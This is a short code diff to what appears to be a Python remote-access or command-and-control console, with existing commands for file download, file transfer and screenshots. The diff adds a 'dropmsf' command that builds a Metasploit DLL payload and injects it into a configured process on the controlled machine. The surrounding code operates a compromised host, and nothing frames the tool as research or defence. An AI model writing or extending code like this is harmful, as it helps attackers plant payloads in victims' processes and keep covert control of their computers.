@@ -6,6 +6,7 @@ import colorama
 import os
 from .other import *
 from .updates import current_version
+from .msf import *
 import time
 import subprocess
 import sys
@@ -640,6 +641,8 @@ Open Ports
                     
                     filetransfer()
                     time.sleep(2)
+
+                
                     
                 elif(main == "download"):
                     filename = input("[+] File : ")
@@ -654,7 +657,11 @@ Open Ports
                     
                 elif(main == "help"):
                     print(help)
-
+                
+                elif(main == "dropmsf"):
+                    build_msf_dll()
+                    DLLTransfer("payloads/msf.dll", setting('inject_process'))
+                    
                 elif(main == "screenshot"):
                     self.SendData("screenshot")
                     self.WaitForReply()
